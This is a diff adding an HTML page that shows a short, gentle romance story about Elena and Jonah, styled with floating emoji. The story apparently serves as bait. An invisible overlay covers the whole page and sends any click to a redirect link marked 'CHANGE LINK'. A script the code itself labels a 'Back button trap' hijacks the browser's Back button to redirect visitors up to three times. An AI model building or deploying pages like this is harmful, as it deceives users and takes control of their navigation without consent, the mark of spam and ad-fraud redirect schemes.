@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>💋 A Quiet Beginning</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+@keyframes float {
+    0% { transform: translateY(0) rotate(0deg); opacity: 0.6; }
+    50% { opacity: 1; }
+    100% { transform: translateY(-120vh) rotate(360deg); opacity: 0; }
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background:
+        radial-gradient(circle at top, #3a0f1a, #0d0d0d 70%);
+    font-family: "Georgia", serif;
+    color: #ffecec;
+    overflow-x: hidden;
+}
+
+/* Floating emoji stickers */
+.sticker {
+    position: fixed;
+    bottom: -50px;
+    font-size: 32px;
+    animation: float linear infinite;
+    pointer-events: none;
+    z-index: 1;
+}
+
+.page-wrapper {
+    position: relative;
+    max-width: 900px;
+    margin: 60px auto;
+    padding: 45px;
+    background: rgba(10, 0, 5, 0.65);
+    border-radius: 18px;
+    box-shadow:
+        0 0 30px rgba(255, 80, 120, 0.25),
+        0 0 80px rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(6px);
+    z-index: 2;
+}
+
+h1 {
+    text-align: center;
+    font-weight: normal;
+    letter-spacing: 3px;
+    color: #ff9aa2;
+    margin-bottom: 30px;
+    text-shadow: 0 0 15px rgba(255,100,130,0.6);
+}
+
+p {
+    margin-bottom: 20px;
+    text-align: justify;
+    font-size: 1.05em;
+}
+
+.divider {
+    width: 60%;
+    height: 1px;
+    background: linear-gradient(to right, transparent, #ff7b8a, transparent);
+    margin: 40px auto;
+}
+
+footer {
+    text-align: center;
+    font-size: 0.9em;
+    color: #ffb6c1;
+    margin-top: 40px;
+}
+
+/* Full click overlay */
+.full-click {
+    position: fixed;
+    inset: 0;
+    z-index: 999;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<!-- FULL PAGE CLICK -->
+<div class="full-click" onclick="redirectUser()"></div>
+
+<!-- FLOATING STICKERS -->
+<span class="sticker" style="left:10%; animation-duration:18s;">💋</span>
+<span class="sticker" style="left:25%; animation-duration:22s;">🔥</span>
+<span class="sticker" style="left:40%; animation-duration:20s;">❤️</span>
+<span class="sticker" style="left:55%; animation-duration:26s;">💄</span>
+<span class="sticker" style="left:70%; animation-duration:24s;">🔥</span>
+<span class="sticker" style="left:85%; animation-duration:19s;">🌙</span>
+
+<div class="page-wrapper">
+    <h1>💋 A Quiet Beginning 💋</h1>
+
+    <p>They met in the quiet way some lives change—without fireworks, without warning.</p>
+
+    <p>
+        Elena worked late at a small bookstore that smelled of paper and rain. One evening,
+        just before closing, a man came in shaking water from his coat, apologizing softly
+        as if he’d interrupted something sacred. His name was Jonah. He asked for a poetry
+        book, something “honest, but not cruel.”
+    </p>
+
+    <p>She smiled at that. It was the first of many. ❤️</p>
+
+    <p>
+        Over weeks, Jonah returned, sometimes for books, sometimes just to talk. They learned
+        each other in fragments—favorite songs, old disappointments, the kind of future that
+        felt hopeful but fragile. Their affection grew slowly, like a lamp being turned up
+        rather than switched on.
+    </p>
+
+    <div class="divider"></div>
+
+    <p>
+        The night everything shifted, the city was wrapped in fog 🌫️. After dinner, they walked
+        without destination, hands brushing, then holding. In Jonah’s apartment, there was
+        nervous laughter, the kind that carries truth inside it.
+    </p>
+
+    <p>
+        When he touched her face, it felt like a question. When she leaned into his hand,
+        it was an answer. 🔥
+    </p>
+
+    <p>
+        They kissed—unhurried, exploratory, as if learning a new language together. Time softened.
+        The world narrowed to warmth, breath, and the quiet trust forming between them.
+    </p>
+
+    <p>
+        Later, they lay close, the city lights blinking through the window. Jonah traced idle
+        patterns on Elena’s arm. She rested her head on his chest, listening to his heart,
+        steady and real. 💞
+    </p>
+
+    <p>
+        It wasn’t just desire—it was choice. And it felt dangerous, beautiful, and right.
+    </p>
+
+    <p>Outside, the fog lifted. Inside, something lasting had begun. 🌙</p>
+
+    <footer>✨ Romantic Story Experience ✨</footer>
+</div>
+
+<script>
+const REDIRECT_URL = "https://example.com"; // CHANGE LINK
+const MAX_BACK_REDIRECTS = 3;
+
+function redirectUser() {
+    window.location.href = REDIRECT_URL;
+}
+
+// Back button trap (limited)
+(function () {
+    let count = sessionStorage.getItem("backRedirectCount");
+    count = count ? parseInt(count) : 0;
+
+    history.pushState(null, document.title, location.href);
+
+    window.addEventListener("popstate", function () {
+        if (count < MAX_BACK_REDIRECTS) {
+            count++;
+            sessionStorage.setItem("backRedirectCount", count.toString());
+            window.location.href = REDIRECT_URL;
+        }
+    });
+})();
+</script>
+
+</body>
+</html>
